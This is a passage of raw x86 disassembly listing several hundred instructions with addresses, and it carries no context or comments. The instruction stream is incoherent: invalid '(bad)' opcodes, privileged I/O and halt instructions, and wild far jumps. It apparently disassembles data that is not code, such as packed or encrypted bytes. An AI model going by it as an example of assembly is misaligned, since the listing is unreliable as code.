  409192:	or     bl,BYTE PTR [ebx+0x1cf5e490]
  409198:	push   ds
  409199:	into   
  40919a:	push   edx
  40919b:	adc    dl,BYTE PTR ds:0x71ddb97b
  4091a1:	ror    BYTE PTR ss:[edi+0x3d],0x7e
  4091a6:	jge    0x409182
  4091a8:	call   0xe46487c3
  4091ad:	popa   
  4091ae:	hlt    
  4091af:	mov    bl,0x4e
  4091b1:	mov    cl,0x16
  4091b3:	sar    edx,cl
  4091b5:	jge    0x40913c
  4091b7:	mov    ebp,DWORD PTR ds:0xa8d5ef3e
  4091bd:	cmp    DWORD PTR [esi-0x74],edx
  4091c0:	and    dl,BYTE PTR [ebx-0x1e]
  4091c3:	mov    ecx,0x85cca78d
  4091c8:	stos   BYTE PTR es:[edi],al
  4091c9:	cmp    eax,0x10e3154b
  4091ce:	(bad)  
  4091cf:	es sbb bh,cl
  4091d2:	add    eax,0xd22eb7c1
  4091d7:	xor    eax,0xe74f5330
  4091dc:	sub    eax,0x1f50b69c
  4091e1:	lea    edx,[eax-0x28]
  4091e4:	sbb    edi,ebx
  4091e6:	cmp    al,dh
  4091e8:	add    al,0x22
  4091ea:	pop    ss
  4091eb:	adc    al,0xea
  4091ed:	or     eax,0xc1ed671a
  4091f2:	pop    edi
  4091f3:	fistp  WORD PTR [edx-0x8]
  4091f6:	pop    ecx
  4091f7:	mov    DWORD PTR [ebp-0x2],edi
  4091fa:	xor    bh,BYTE PTR fs:[edx+0x4b0d15fc]
  409201:	scas   al,BYTE PTR es:[edi]
  409202:	push   cs
  409203:	sub    eax,0x1ec9feee
  409208:	out    dx,al
  409209:	xor    al,0x7c
  40920b:	test   eax,esp
  40920d:	xor    edx,DWORD PTR [edi]
  40920f:	jmp    0x409273
  409211:	ins    DWORD PTR es:[edi],dx
  409212:	int    0x9c
  409214:	test   BYTE PTR [ecx],ah
  409216:	adc    DWORD PTR [eax-0x75],edi
  409219:	mov    ebx,0x7525d163
  40921e:	inc    edi
  40921f:	test   dl,dh
  409221:	sahf   
  409222:	jmp    0xe549:0xd1362202
  409229:	mov    bh,0xf6
  40922b:	pop    edx
  40922c:	or     al,0xe9
  40922e:	xchg   edi,eax
  40922f:	shl    DWORD PTR [ecx+0x2d465b7a],0xa1
  409236:	jle    0x4092b4
  409238:	and    eax,0x45b6f4fa
  40923d:	pop    es
  40923e:	xchg   edx,eax
  40923f:	das    
  409240:	or     ebx,ecx
  409242:	xchg   esp,eax
  409243:	xor    ebx,DWORD PTR [ecx+0x5e]
  409246:	push   0x5c
  409248:	mov    dh,0xd1
  40924a:	arpl   WORD PTR ds:0x151efcca,bp
  409250:	push   eax
  409251:	test   BYTE PTR [ebp-0x6c],bh
  409254:	popf   
  409255:	pop    edx
  409257:	mov    bl,0x37
  409259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40925a:	int    0x82
  40925c:	sbb    DWORD PTR [ebp-0x55],esp
  40925f:	and    DWORD PTR [eax+0x4d3e63a6],esp
  409265:	sub    DWORD PTR [ecx],edx
  409267:	xchg   BYTE PTR [ebx-0x6ba1548f],dl
  40926d:	jno    0x4092cb
  40926f:	adc    esi,DWORD PTR [edi]
  409271:	adc    eax,DWORD PTR [eax+esi*2-0x1b]
  409275:	push   ss
  409276:	jbe    0x4092ab
  409278:	test   DWORD PTR [ebx],esp
  40927a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40927b:	mov    ah,0xa0
  40927d:	aad    0xe8
  40927f:	xchg   edi,eax
  409280:	jge    0x40929f
  409282:	sbb    al,0x7c
  409284:	inc    edi
  409285:	xor    eax,esp
  409287:	jmp    0x2e918768
  40928c:	js     0x409274
  40928e:	mov    ch,BYTE PTR [eax]
  409290:	jmp    0x4f38:0xd38e564b
  409297:	icebp  
  409298:	lds    edx,FWORD PTR [edx+0x317a4ea7]
  40929e:	jne    0x409315
  4092a0:	mov    edx,0x116235bc
  4092a5:	dec    edx
  4092a6:	jb     0x409240
  4092a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092a9:	ret    0x73c9
  4092ac:	adc    al,0x50
  4092ae:	(bad)  
  4092af:	cmc    
  4092b0:	add    esi,ecx
  4092b2:	adc    edx,DWORD PTR [edx-0x16d805b4]
  4092b8:	daa    
  4092b9:	push   ds
  4092ba:	sub    eax,0x2841ee43
  4092bf:	popa   
  4092c0:	add    DWORD PTR ds:0xcb8563fe,0x29
  4092c7:	sbb    BYTE PTR [eax],0x18
  4092ca:	std    
  4092cb:	and    al,BYTE PTR [esi-0x1a26bfbc]
  4092d1:	xchg   ecx,eax
  4092d2:	xchg   BYTE PTR [eax+0x4adfc055],ch
  4092d8:	cmp    bl,ah
  4092da:	std    
  4092db:	iret   
  4092dc:	mov    WORD PTR [edi],gs
  4092de:	retf   
  4092df:	adc    al,0xb0
  4092e1:	adc    al,0x1d
  4092e3:	and    eax,0x9d3f542b
  4092e8:	jb     0x40933f
  4092ea:	gs test eax,0x5c2c1fdd
  4092f0:	popf   
  4092f1:	syscall 
  4092f3:	leave  
  4092f4:	(bad)  
  4092f6:	push   ecx
  4092f7:	sahf   
  4092f8:	aad    0xb4
  4092fa:	cmp    ch,BYTE PTR [ecx-0x7e9bb87c]
  409300:	stc    
  409301:	ret    0xbf4d
  409304:	retf   0xd647
  409307:	push   cs
  409308:	shl    bl,cl
  40930a:	out    0x95,eax
  40930c:	out    dx,eax
  40930d:	pop    ebp
  40930e:	retf   
  40930f:	sbb    BYTE PTR [ecx],dl
  409311:	inc    ecx
  409312:	mov    BYTE PTR [esi-0x2f0394bc],dh
  409318:	sub    al,0xb6
  40931a:	mov    ebx,0x65b4df40
  40931f:	mov    ebp,edx
  409321:	(bad)  
  409323:	jmp    0xfadce868
  409328:	mov    ds:0xbaacfb81,eax
  40932d:	and    al,BYTE PTR [ebp+ebx*8+0x3adb5d25]
  409334:	sub    bh,ch
  409336:	into   
  409337:	addr16 add ah,cl
  40933a:	push   0x67
  40933c:	lea    edx,[ebx-0x79d1b697]
  409342:	clc    
  409343:	mov    ds:0xb7c076c0,al
  409348:	xor    ch,BYTE PTR [ecx+0x6a]
  40934b:	mov    WORD PTR [esp+edi*2+0x7ac147fd],es
  409352:	dec    ebx
  409353:	mov    ds:0xf791c840,eax
  409358:	push   esi
  409359:	push   ds
  40935a:	dec    edi
  40935b:	push   ebx
  40935c:	mov    al,BYTE PTR [edx+0x5c]
  40935f:	ja     0x4093be
  409361:	add    esp,DWORD PTR [eax]
  409363:	xchg   ebp,eax
  409364:	in     eax,dx
  409365:	adc    DWORD PTR [edx+0x79f187f6],0xef6800c7
  40936f:	mov    esi,0x2d7b9b7b
  409374:	aaa    
  409375:	xor    eax,0x11ad71ed
  40937a:	sub    eax,eax
  40937c:	sub    DWORD PTR [eax+ebx*2-0x21f0bd4c],esp
  409383:	or     eax,0x238b2ebe
  409388:	push   edi
  409389:	xchg   esi,eax
  40938a:	mov    cl,0x5b
  40938c:	cmp    BYTE PTR [ebx-0x13c7346c],bh
  409392:	shl    DWORD PTR [edx+esi*2+0x3e],cl
  409396:	dec    edx
  409397:	inc    esi
  409398:	(bad)  [esi-0x58]
  40939b:	dec    ecx
  40939c:	pop    ebx
  40939d:	push   eax
  40939e:	xchg   esp,eax
  40939f:	fmul   QWORD PTR [ebp-0x4]
  4093a2:	xchg   edx,eax
  4093a3:	inc    esi
  4093a4:	out    0xa8,eax
  4093a6:	aad    0xa5
  4093a8:	or     eax,0xe973ddf8
  4093ad:	adc    DWORD PTR [edi-0x1e],ebp
  4093b0:	in     eax,dx
  4093b1:	out    0xcc,al
  4093b3:	imul   eax,DWORD PTR [edi],0x2c
  4093b6:	(bad)  
  4093b7:	shl    bh,1
  4093b9:	jmp    0x40941d
  4093bb:	mov    bl,0xf9
  4093bd:	push   es
  4093be:	ja     0x409350
  4093c0:	pop    ss
  4093c1:	arpl   WORD PTR [ebx+0x44cc83a1],bx
  4093c7:	mov    ds:0x2ca79f06,eax
  4093cc:	leave  
  4093cd:	cmp    bh,al
  4093cf:	mov    es,edx
  4093d1:	sub    esp,DWORD PTR [eax+0x73659461]
  4093d7:	mov    ?,WORD PTR [eax+eax*4-0x1b589728]
  4093de:	fwait
  4093df:	out    0x12,eax
  4093e1:	pop    es
  4093e2:	fsub   st,st(7)
  4093e4:	xchg   esp,eax
  4093e5:	sbb    eax,0x864358bb
  4093ea:	or     al,0xbf
  4093ec:	xchg   DWORD PTR [esi],edi
  4093ee:	xor    edx,eax
  4093f0:	mov    WORD PTR [edx-0x5b],cs
  4093f3:	mov    es,esp
  4093f5:	sbb    BYTE PTR [esp+edi*2-0x75f75b36],al
  4093fc:	lea    esi,[ecx+0x4]
  4093ff:	jnp    0x40946a
  409401:	xor    DWORD PTR [esi],ebp
  409403:	pop    esi
  409404:	push   0xffffffdc
  409406:	(bad)  
  409407:	clc    
  409408:	rol    DWORD PTR [ebp-0x69],0xb7
  40940c:	xlat   BYTE PTR ds:[ebx]
  40940d:	and    al,0x9
  40940f:	sub    edx,DWORD PTR [ebp+ecx*1+0x4074f57b]
  409416:	sub    DWORD PTR [ecx-0x255c3ecd],0x24
  40941d:	(bad)  
  40941e:	sti    
  40941f:	aam    0xc1
  409421:	shl    DWORD PTR [edi-0x1a],0xd2
  409425:	push   ebx
  409426:	fisubr DWORD PTR [ebx]
  409428:	ins    BYTE PTR es:[edi],dx
  409429:	fucomip st,st(0)
  40942b:	pop    ecx
  40942c:	or     DWORD PTR [esi+0x79],edx
  40942f:	xchg   esi,eax
  409430:	inc    esi
  409431:	fidiv  WORD PTR [esi]
  409433:	cmp    DWORD PTR [edi],0xd1544bd4
  409439:	inc    ebp
  40943a:	daa    
  40943b:	sbb    al,0xe4
  40943d:	add    bl,0xf9
  409440:	lods   eax,DWORD PTR ds:[esi]
  409441:	inc    eax
  409442:	lock inc esp
  409444:	adc    eax,0xd93f5dbd
  409449:	pop    esi
  40944a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40944b:	xchg   BYTE PTR [ecx-0x7e3cf542],bl
  409451:	mov    ecx,0x6f9ed73e
  409456:	cdq    
  409457:	add    BYTE PTR [eax-0x27c087e0],bh
  40945d:	scas   eax,DWORD PTR es:[edi]
  40945e:	bound  ebp,QWORD PTR [esi]
  409460:	int3   
  409461:	sbb    eax,0x14f74a1e
  409466:	dec    esi
  409467:	test   BYTE PTR [ecx-0x66],ah
  40946a:	pop    esi
  40946b:	inc    edi
  40946c:	adc    al,0x14
  40946e:	dec    edi
  40946f:	lds    edi,FWORD PTR [edx-0x7d]
  409472:	(bad)  
  409473:	dec    edi
  409474:	hlt    
  409475:	fadd   QWORD PTR [esi-0x23]
  409478:	or     bh,BYTE PTR [edi]
  40947a:	mov    ecx,0x58c28491
  40947f:	je     0x4094fd
  409481:	(bad)  
  409482:	aaa    
  409483:	iret   
  409484:	jae    0x4094a5
  409486:	popf   
  409487:	stc    
  409488:	arpl   WORD PTR [esi],bp
  40948a:	inc    ecx
  40948b:	mov    bl,0x2e
  40948d:	pop    es
  40948e:	in     al,dx
  40948f:	fisttp DWORD PTR [ebp+0x5b]
  409492:	dec    eax
  409493:	(bad)  
  409495:	leave  
  409496:	mov    ecx,gs
  409498:	push   ss
  409499:	ss mov ch,0x22
  40949c:	jle    0x409443
  40949e:	in     al,dx
  40949f:	xchg   BYTE PTR [esi+esi*1],bh
  4094a2:	ins    BYTE PTR es:[edi],dx
  4094a3:	aas    
  4094a4:	stos   BYTE PTR es:[edi],al
  4094a5:	mov    BYTE PTR [eax+0x7f],ch
  4094a8:	cmp    cl,ah
  4094aa:	bound  edx,QWORD PTR [ebx]
  4094ac:	nop
  4094ad:	shl    DWORD PTR [edx],0x56
  4094b0:	retf   0x9a68
  4094b3:	mov    al,ds:0x17bf98d5
  4094b8:	das    
  4094b9:	(bad)  
  4094bb:	mov    al,ds:0xe2884005
  4094c0:	cmp    BYTE PTR [edx],cl
  4094c2:	loope  0x4094cc
  4094c4:	inc    esi
  4094c5:	fisttp QWORD PTR [eax+0x7c0ebcb6]
  4094cb:	jle    0x409541
  4094cd:	js     0x409502
  4094cf:	dec    ebp
  4094d0:	inc    BYTE PTR [esi+0x40d916d2]
  4094d6:	inc    edx
  4094d7:	cli    
  4094d8:	dec    edx
  4094d9:	int3   
  4094da:	shr    BYTE PTR [ebp-0x22db68b0],1
  4094e0:	pop    ds
  4094e1:	iret   
  4094e2:	iret   
  4094e3:	stos   BYTE PTR es:[edi],al
  4094e4:	adc    eax,0x663e50fd
  4094e9:	mov    eax,ss:0x93c811a5
  4094ef:	adc    DWORD PTR [ebx+0x6ed2dec8],eax
  4094f5:	and    BYTE PTR [esi],ah
  4094f7:	test   BYTE PTR [edi],0xb9
  4094fa:	and    BYTE PTR [ebx],bl
  4094fc:	loopne 0x40951e
  4094fe:	adc    BYTE PTR [edx-0x5],bl
  409501:	idiv   WORD PTR [edx+0x6f]
  409505:	and    eax,0x6b3212d
  40950a:	inc    ecx
  40950b:	xchg   ecx,eax
  40950c:	loopne 0x409505
  40950e:	mov    edx,ebp
  409510:	add    DWORD PTR [edi],esp
  409512:	cmp    eax,0x7a823788
  409517:	or     eax,0xb0d8fc3d
  40951c:	(bad)  
  40951d:	pop    ds
  40951e:	mov    eax,0x4bd3e752
  409523:	add    ebx,DWORD PTR [edi]
  409525:	lea    ebp,[ebp-0x64]
  409528:	inc    esi
  409529:	out    dx,al
  40952a:	pop    ss
  40952b:	shl    BYTE PTR [esi],1
  40952d:	lds    edx,FWORD PTR [edx]
  40952f:	inc    ecx
  409530:	pop    esi
  409531:	ins    BYTE PTR es:[edi],dx
  409532:	loopne 0x409539
  409534:	jns    0x409525
  409536:	dec    edx
  409537:	xchg   edx,eax
  409538:	sahf   
  409539:	mov    dl,BYTE PTR [ebx+0x5a6e833]
  40953f:	jbe    0x4095b7
  409541:	and    cl,BYTE PTR [ecx]
  409543:	das    
  409544:	mov    ds:0xa51ef499,al
  409549:	stos   DWORD PTR es:[edi],eax
  40954a:	scas   eax,DWORD PTR es:[edi]
  40954b:	sub    DWORD PTR [esi+0x60],ecx
  40954e:	add    BYTE PTR [ebx+eax*1-0x689ad57f],0x99
  409556:	add    eax,0xfb5871d6
  40955b:	mov    bh,0x5c
  40955d:	popa   
  40955e:	fcomp  DWORD PTR [edx+0x7c]
  409561:	cmc    
  409562:	push   eax
  409563:	popa   
  409564:	mov    ebp,0x4a2161e0
  409569:	je     0x40952b
  40956b:	xor    al,0x60
  40956d:	and    BYTE PTR [edx],bl
  40956f:	push   eax
  409570:	pop    ecx
  409571:	or     DWORD PTR [ecx+0x35],eax
  409574:	mov    al,ds:0x48c6ed63
  409579:	dec    ebx
  40957a:	fs push esp
  40957c:	pop    esp
  40957d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40957e:	(bad)  
  40957f:	in     al,dx
  409580:	js     0x409559
  409582:	ss into 
  409584:	imul   edi,DWORD PTR [esi+0x3c],0x22fcf84c
  40958b:	push   0x2e7f7620
  409590:	xor    ebp,DWORD PTR [esi]
  409592:	fs popf 
  409594:	(bad)  
  409595:	ror    BYTE PTR [esi],cl
  409597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409598:	fistp  QWORD PTR [edi]
  40959a:	nop
  40959b:	popf   
  40959c:	pop    ebp
  40959d:	aas    
  40959e:	fist   DWORD PTR [ebp+0x69662ffd]
  4095a4:	leave  
  4095a5:	add    DWORD PTR [ebx],ecx
  4095a7:	xor    BYTE PTR [edx+ebp*1-0x41],dh
  4095ab:	cs jge 0x40955a
  4095ae:	sahf   
  4095af:	sub    BYTE PTR ds:0x82c1cd05,al
  4095b5:	(bad)  
  4095b6:	mov    esi,0x86f7a40d
  4095bb:	sub    eax,0x7f65b7b9
  4095c0:	shl    BYTE PTR ds:0x5075a850,0x65
  4095c7:	mov    fs:0x109b2c10,al
  4095cd:	pop    ecx
  4095ce:	stc    
  4095cf:	xchg   ebp,eax
  4095d0:	rcl    BYTE PTR [ebp+0x5cf821cb],cl
  4095d6:	out    0xe3,eax
  4095d8:	das    
  4095d9:	out    dx,eax
  4095da:	mov    ah,0xa0
  4095dc:	sub    ebp,edi
  4095de:	jmp    0x4095ac
  4095e0:	xor    dl,BYTE PTR [esp+ebx*2+0x65]
  4095e4:	rcr    BYTE PTR ds:0x8024aaf3,0x33
  4095eb:	cdq    
  4095ec:	stos   BYTE PTR es:[edi],al
  4095ed:	add    esi,DWORD PTR [edx]
  4095ef:	cmp    eax,0xb5bcfc03
  4095f4:	sub    esi,DWORD PTR ds:0x87188411
  4095fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095fb:	mov    ebp,0x69e47d7d
  409600:	mov    dh,BYTE PTR [eax-0x70a18555]
  409606:	imul   bl
  409608:	mov    al,ds:0xcafbae23
  40960d:	sti    
  40960e:	scas   al,BYTE PTR es:[edi]
  40960f:	mov    edx,0x9efd6466
  409614:	je     0x409622
  409616:	xchg   edx,eax
  409617:	loop   0x4095e1
  409619:	jmp    0x6080ec1a
  40961e:	data16 in al,dx
  409620:	fucom  st(1)
  409622:	test   al,0x27
  409624:	fbstp  TBYTE PTR [di+0x34]
  409628:	outs   dx,BYTE PTR ds:[esi]
  409629:	mov    ch,0xa7
  40962b:	or     BYTE PTR [ebx+ecx*4-0x14acc42a],bl
  409632:	lahf   
  409633:	int3   
  409634:	aaa    
  409635:	fdivr  DWORD PTR [edx-0x6cecff56]
  40963b:	and    BYTE PTR [eax-0x74206e51],dl
  409641:	pop    ebp
  409642:	cdq    
  409643:	into   
  409644:	mov    esp,0xe434f341
  409649:	aas    
  40964a:	cmp    eax,0x2c
  40964d:	mov    ds:0x28d4c371,al
  409652:	jmp    0x409697
  409654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409655:	dec    eax
  409656:	fwait
  409657:	sbb    ebx,esi
  409659:	pop    ecx
  40965a:	mov    ecx,0xccabd293
  40965f:	or     BYTE PTR [esi],dh
  409661:	in     eax,0x65
  409663:	xchg   edx,eax
  409664:	or     eax,0xcf96e9f
  409669:	adc    esi,esi
  40966b:	clc    
  40966c:	sub    al,0x7
  40966e:	xor    eax,0xe7c2d16b
  409673:	xchg   esp,eax
  409674:	arpl   WORD PTR [eax+0x12a642c0],cx
  40967a:	cmp    DWORD PTR [ebp-0x3095c2],eax
  409680:	dec    eax
  409681:	hlt    
  409682:	ucomiss xmm4,xmm5
  409685:	cmp    ah,BYTE PTR [esi]
  409687:	or     DWORD PTR [ebx],esi
  409689:	xchg   esi,eax
  40968a:	loopne 0x4096e8
  40968c:	jp     0x4096f9
  40968e:	add    esp,DWORD PTR [edx-0x50cc5ab8]
  409694:	das    
  409695:	mov    bl,0x32
  409697:	int3   
  409698:	retf   0x4641
  40969b:	xchg   edx,eax
  40969c:	sub    eax,0xb7b940b7
  4096a1:	repz imul edi,DWORD PTR [ebp-0x20],0x29e9643d
  4096a9:	mov    esi,0xe6215579
  4096ae:	adc    eax,0x44671057
  4096b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096b4:	sub    cl,BYTE PTR [esi+0x55]
  4096b7:	gs adc eax,0x8a7fee44
  4096bd:	ins    DWORD PTR es:[edi],dx
  4096be:	scas   eax,DWORD PTR es:[edi]
  4096bf:	xchg   edx,eax
  4096c0:	mov    ecx,DWORD PTR [edi-0x16]
  4096c3:	mov    ds:0xb908f896,eax
  4096c8:	pop    esi
  4096c9:	in     eax,dx
  4096ca:	imul   DWORD PTR [ebx]
  4096cc:	jno    0x4096a6
  4096ce:	jmp    0x409668
  4096d0:	ja     0x409698
  4096d2:	cmp    edi,0x93e3ce77
  4096d8:	cmp    al,ah
  4096da:	dec    eax
  4096db:	push   edx
  4096dc:	xor    DWORD PTR [edi+0x28],eax
  4096df:	ss add ecx,ecx
  4096e2:	fwait
  4096e3:	test   edi,eax
  4096e5:	mov    ebx,0xf38fbcc9
  4096ea:	cli    
  4096eb:	jb     0x409759
  4096ed:	cmp    eax,0x8639184d
  4096f2:	loope  0x409747
  4096f4:	dec    edi
  4096f5:	inc    esi
  4096f6:	pusha  
  4096f7:	fsub   DWORD PTR [esi+0x89ae918]
  4096fd:	sbb    DWORD PTR [ebp+eax*1+0x5f616a2f],eax
  409704:	sub    al,BYTE PTR [ebp+ebp*2-0xadf77ed]
  40970b:	push   edx
  40970c:	fs inc esi
  40970f:	xor    dl,dh
  409711:	(bad)  
  409712:	lock add BYTE PTR [ecx-0x2f69b0ae],0x6
  40971a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40971b:	and    dh,bl
  40971d:	cli    
  40971e:	aad    0x53
  409720:	xchg   ebx,eax
  409721:	das    
  409722:	mov    bh,0xf
  409724:	mov    edx,0x23b97c4e
  409729:	or     ebx,edx
  40972b:	jne    0x409700
  40972d:	leave  
  40972e:	mov    ebp,0xd298a4c8
  409733:	hlt    
  409734:	in     eax,0x32
  409736:	pop    ebx
  409737:	rcl    ch,0x24
  40973a:	xchg   ebp,eax
  40973b:	add    BYTE PTR [esi+0x57b361b7],0x3f
  409742:	sar    DWORD PTR [edx],cl
  409744:	test   eax,0x4a9e5889
  409749:	inc    eax
  40974a:	jnp    0x409791
  40974c:	lahf   
  40974d:	inc    eax
  40974e:	stos   BYTE PTR es:[edi],al
  40974f:	das    
  409750:	push   cs
  409751:	cmp    DWORD PTR [ebp-0x723652f2],esi
  409757:	clc    
  409758:	les    eax,FWORD PTR [ebx+0x25e5a9b1]
  40975e:	test   eax,0x7108d77a
  409763:	dec    ebp
  409764:	dec    edi
  409765:	xchg   ecx,eax
  409766:	jne    0x409764
  409768:	mov    al,ds:0x383e9954
  40976d:	mov    bl,0xb0
  40976f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409770:	imul   esi,DWORD PTR [eax+0x51],0xdd02eaed
  409777:	iret   
  409778:	fst    DWORD PTR [ebx]
  40977a:	aam    0xab
  40977c:	inc    edi
  40977d:	test   BYTE PTR [edx+0x718025bc],0xe3
  409784:	cmp    al,0x44
  409786:	adc    BYTE PTR [esi],bl
  409788:	call   0x99a9de17
  40978d:	(bad)  [edx]
  40978f:	js     0x4097b6
  409791:	adc    DWORD PTR [edx-0x57],0xe5fb5a84
  409798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409799:	sbb    BYTE PTR [ecx+0x33],bh
  40979c:	xchg   DWORD PTR [ecx-0x37],eax
  40979f:	sub    DWORD PTR [ecx+0x66bd753],eax
  4097a5:	fidiv  DWORD PTR [eax-0x3c25b578]
  4097ab:	out    dx,eax
  4097ac:	add    eax,0x5b996abd
  4097b1:	mov    ecx,0xd226282e
  4097b6:	adc    al,0x2f
  4097b8:	jmp    0x409744
  4097ba:	cmc    
  4097bb:	fs stos DWORD PTR es:[edi],eax
  4097bd:	into   
  4097be:	cld    
  4097bf:	ret    0x4c27
  4097c2:	mov    ecx,0xe2e6b846
  4097c7:	mov    al,bl
  4097c9:	mov    ah,0x78
  4097cb:	(bad)  
  4097cc:	mov    bl,0x72
  4097ce:	mov    eax,0x3733aa00
  4097d3:	sbb    eax,0x7a76b92e
  4097d8:	adc    eax,0x819961a3
  4097dd:	push   ds
  4097de:	arpl   WORD PTR fs:[esp+ebp*1+0x7eeb88d3],dx
  4097e6:	xor    eax,ebp
  4097e8:	pop    ebx
  4097e9:	(bad)  
  4097ea:	jle    0x4097f6
  4097ec:	pop    esp
  4097ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097ee:	cs xor eax,0x91ea4fc5
  4097f4:	(bad)  
  4097f5:	retf   
  4097f6:	adc    cl,BYTE PTR [edx+0x41]
  4097f9:	sub    edx,0xffffffbb
  4097fc:	dec    edi
  4097fd:	cmp    BYTE PTR [ebp-0x59],dh
  409800:	sbb    ah,BYTE PTR [esi+0x8]
  409803:	in     eax,dx
  409804:	sub    ecx,DWORD PTR [ebp-0x60745c34]
  40980a:	cdq    
  40980b:	dec    ebx
  40980c:	jb     0x409868
  40980e:	mov    ebp,ebx
  409810:	dec    ebx
  409811:	fisubr WORD PTR [edx+0x5fc7739d]
  409817:	in     eax,dx
  409818:	montmul (bad)
  409819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40981a:	ret    0xe830
  40981d:	jl     0x40980d
  40981f:	mov    ebx,0x5858566c
  409824:	lds    ebx,FWORD PTR [edx]
  409826:	ret    0x85aa
  409829:	mov    DWORD PTR [ebx+0x6c4d11be],esi
  40982f:	jge    0x40982d
  409831:	push   ds
  409832:	inc    edi
  409833:	mov    al,ds:0x5f1b9763
  409838:	iret   
  409839:	add    eax,0x882ce0a7
  40983e:	push   esp
  40983f:	popa   
  409840:	cli    
  409841:	jmp    0x409873
  409843:	cdq    
  409844:	mov    WORD PTR [ecx+esi*8],ss
  409847:	push   0x64
  409849:	dec    eax
  40984a:	sahf   
  40984b:	das    
  40984c:	jg     0x409818
  40984e:	ss (bad) 
  409850:	sar    DWORD PTR [edx+eiz*2],cl
  409853:	sbb    BYTE PTR [eax+0xd],ah
  409856:	cmp    BYTE PTR [ecx-0x18b4dcc8],bl
  40985c:	mov    edx,0x124eceab
  409861:	xlat   BYTE PTR ds:[ebx]
  409862:	push   ss
  409863:	pop    edi
  409864:	in     al,0x3
  409866:	inc    ebx
  409867:	dec    edx
  409868:	ret    0xc8b
  40986b:	loop   0x409810
  40986d:	pop    ebx
  40986e:	push   0xf8ed9191
  409873:	push   edx
  409874:	mov    ah,0x70
  409876:	(bad)  
  409877:	sub    DWORD PTR ds:0xba88e151,ecx
  40987d:	xchg   edi,eax
  40987e:	mov    dh,0x79
  409880:	mov    esi,0xb5f6be74
  409885:	sbb    eax,0xf1f55381
  40988a:	test   DWORD PTR [ebp+eax*1+0x44c20b41],ecx
  409891:	jge    0x40989d
  409893:	and    cl,BYTE PTR [eax]
  409895:	imul   esi,eax,0x2b
  409898:	ins    BYTE PTR es:[edi],dx
  409899:	push   0x6
  40989b:	sub    dh,BYTE PTR [ecx+ebp*4]
  40989e:	icebp  
  40989f:	dec    ebx
  4098a0:	pop    ecx
  4098a1:	jns    0x4098ae
  4098a3:	mov    ebx,ecx
  4098a5:	xchg   ebp,eax
  4098a6:	xchg   edi,eax
  4098a7:	jp     0x40991d
  4098a9:	sub    edx,esp
  4098ab:	sbb    BYTE PTR [esi+0x3e],ch
  4098ae:	das    
  4098af:	sar    DWORD PTR [eax],cl
  4098b1:	ror    BYTE PTR [ecx],cl
  4098b3:	rcr    DWORD PTR [edi],cl
  4098b5:	mov    al,fs:0xbb2f9768
  4098bb:	fistp  DWORD PTR [esp+ebx*1-0x1a3832bd]
  4098c2:	aad    0x84
  4098c4:	or     DWORD PTR ds:0xb7b0031,edi
  4098ca:	mov    dl,0xba
  4098cc:	test   eax,0xaf61e710
  4098d1:	mov    WORD PTR [ebp-0x73],cs
  4098d4:	jge    0x40992f
  4098d6:	(bad)  
  4098d7:	sahf   
  4098d8:	push   edx
  4098d9:	lods   al,BYTE PTR ds:[esi]
  4098da:	mov    ?,WORD PTR [ecx+0x69]
  4098dd:	xor    ch,dh
  4098df:	ja     0x409930
  4098e1:	std    
  4098e2:	mov    fs,WORD PTR [ebx-0x263c143a]
  4098e8:	push   eax
  4098e9:	lds    edx,FWORD PTR [edx-0x1a]
  4098ec:	rcr    ebx,0x1d
  4098ef:	push   eax
  4098f0:	cmp    eax,0xf004b69b
  4098f5:	jno    0x40988e
  4098f7:	and    ebx,DWORD PTR [eax-0x2aec5cf6]
  4098fd:	hlt    
  4098fe:	pushf  
  4098ff:	jmp    0xf61e:0xa77de7f5
  409906:	(bad)  
  409908:	pop    edx
  409909:	sbb    eax,0x68a33931
  40990e:	das    
  40990f:	mov    esp,0xf372bc5b
  409914:	xor    eax,0x970ad2fb
  409919:	pushf  
  40991a:	jecxz  0x40990b
  40991c:	xchg   esi,eax
  40991d:	jns    0x409908
  40991f:	cmp    DWORD PTR [eax],edi
  409921:	mov    al,ds:0x3b952bd0
  409926:	inc    ebx
  409927:	jl     0x4098b5
  409929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40992a:	cmp    BYTE PTR [esi-0x5a],dh
  40992d:	popf   
  40992e:	aad    0xf6
  409930:	push   edx
  409931:	in     eax,0xe0
  409933:	into   
  409934:	cli    
  409935:	xor    BYTE PTR [esi*1+0x32e8e745],0xe8
  40993d:	imul   ebx,DWORD PTR [edi-0x3],0x6bc727d2
  409944:	cli    
  409945:	aad    0xaf
  409947:	xor    BYTE PTR [ebx-0x3ea7bd2f],bh
  40994d:	ins    BYTE PTR es:[edi],dx
  40994e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40994f:	stos   BYTE PTR es:[edi],al
  409950:	inc    edi
  409951:	mov    bh,0x2e
  409953:	and    al,0x97
  409955:	arpl   WORD PTR [ebp-0x5f],di
  409958:	sbb    eax,0x7df99bef
  40995d:	imul   ecx,DWORD PTR [ecx+0xc162985],0xffffffa9
  409964:	or     ebp,DWORD PTR [ebx-0x7b]
  409967:	cmp    DWORD PTR [ecx+0x60],ebx
  40996a:	leave  
  40996b:	cwde   
  40996c:	pusha  
  40996d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996e:	mov    cl,dl
  409970:	sub    eax,0xcaf621ef
  409975:	outs   dx,BYTE PTR ds:[esi]
  409976:	fistp  DWORD PTR [esi+0x3b33a4da]
  40997c:	sbb    bh,bh
  40997e:	jl     0x40996a
  409980:	push   ebx
  409981:	in     al,0xd5
  409983:	(bad)  
  409984:	pop    eax
  409985:	imul   esi,DWORD PTR [esi],0x33d78a8e
  40998b:	xchg   edx,eax
